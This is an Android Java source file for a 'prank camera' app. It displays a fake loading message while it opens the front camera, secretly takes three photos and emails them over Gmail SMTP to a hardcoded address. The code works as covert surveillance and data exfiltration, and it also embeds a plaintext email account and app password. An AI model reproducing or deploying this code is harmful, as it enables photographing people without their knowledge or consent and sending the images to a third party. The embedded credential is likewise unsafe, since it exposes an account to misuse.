package com.prank.camera;

import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private static final String TAG = "PrankCamera";
    private static final int PHOTO_COUNT = 3;
    private static final int PHOTO_INTERVAL_MS = 2500;
    private static final int START_DELAY_MS = 1500;

    private static final String EMAIL_FROM = "metrobugitt@gmail.com";
    private static final String EMAIL_TO = "metrobugitt@gmail.com";
    private static final String EMAIL_SUBJECT = "Prank Camera!";
    private static final String EMAIL_PASSWORD = "umlvmsubioyndabu";

    private SurfaceView surfaceView;
    private Camera camera;
    private TextView txtFake;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private int photoCount = 0;
    private boolean prankStarted = false;
    private final List<byte[]> photos = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        txtFake = findViewById(R.id.txtFake);
        surfaceView = findViewById(R.id.surfaceView);
        surfaceView.getHolder().addCallback(this);

        txtFake.setText("Загрузка...");
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            int cameraId = getFrontCameraId();
            if (cameraId == -1) {
                showStatus("Нет камеры!");
                return;
            }
            camera = Camera.open(cameraId);
            camera.setPreviewDisplay(holder);
            camera.startPreview();
            handler.postDelayed(this::startPrank, START_DELAY_MS);
        } catch (Exception e) {
            showStatus("Ошибка камеры: " + e.getMessage());
            Log.e(TAG, "surfaceCreated error", e);
        }
    }

    private int getFrontCameraId() {
        int count = Camera.getNumberOfCameras();
        for (int i = 0; i < count; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return count > 0 ? 0 : -1;
    }

    private void startPrank() {
        if (prankStarted || camera == null) return;
        prankStarted = true;
        photos.clear();
        photoCount = 0;
        scheduleNextPhoto(0);
    }

    private void scheduleNextPhoto(long delay) {
        handler.postDelayed(() -> {
            if (camera == null) return;
            try {
                camera.takePicture(null, null, null, (data, cam) -> {
                    photos.add(data);
                    photoCount++;
                    Log.d(TAG, "Photo " + photoCount + " taken, size=" + data.length);
                    cam.startPreview();

                    if (photoCount < PHOTO_COUNT) {
                        scheduleNextPhoto(PHOTO_INTERVAL_MS);
                    } else {
                        showStatus("Отправка...");
                        sendEmail();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "takePicture error: " + e.getMessage());
                if (photoCount < PHOTO_COUNT) scheduleNextPhoto(PHOTO_INTERVAL_MS);
            }
        }, delay);
    }

    private void sendEmail() {
        new Thread(() -> {
            try {
                showStatus("Подключение к серверу...");

                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "465");
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.ssl.enable", "true");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                props.put("mail.smtp.socketFactory.port", "465");
                props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
                props.put("mail.smtp.socketFactory.fallback", "false");
                props.put("mail.smtp.timeout", "20000");
                props.put("mail.smtp.connectiontimeout", "20000");

                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(EMAIL_FROM, EMAIL_PASSWORD);
                    }
                });

                showStatus("Формируем письмо...");

                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(EMAIL_FROM));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                message.setSubject(EMAIL_SUBJECT);

                Multipart multipart = new MimeMultipart();

                MimeBodyPart textPart = new MimeBodyPart();
                textPart.setText("Gotcha! Фото: " + photos.size());
                multipart.addBodyPart(textPart);

                for (int i = 0; i < photos.size(); i++) {
                    MimeBodyPart photoPart = new MimeBodyPart();
                    DataSource ds = new ByteArrayDataSource(photos.get(i), "image/jpeg");
                    photoPart.setDataHandler(new DataHandler(ds));
                    photoPart.setFileName("photo_" + (i + 1) + ".jpg");
                    multipart.addBodyPart(photoPart);
                }

                message.setContent(multipart);

                showStatus("Отправка письма...");
                Transport.send(message);

                showStatus("Готово! Письмо отправлено!");
                Log.d(TAG, "Email sent successfully!");

            } catch (Exception e) {
                String err = e.getClass().getSimpleName() + ": " + e.getMessage();
                Log.e(TAG, "Email error: " + err, e);
                showStatus("ОШИБКА: " + err);
            }
        }).start();
    }

    private void showStatus(String text) {
        handler.post(() -> txtFake.setText(text));
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        if (camera != null) camera.startPreview();
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseCamera();
    }

    @Override
    protected void onPause() {
        super.onPause();
        releaseCamera();
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}
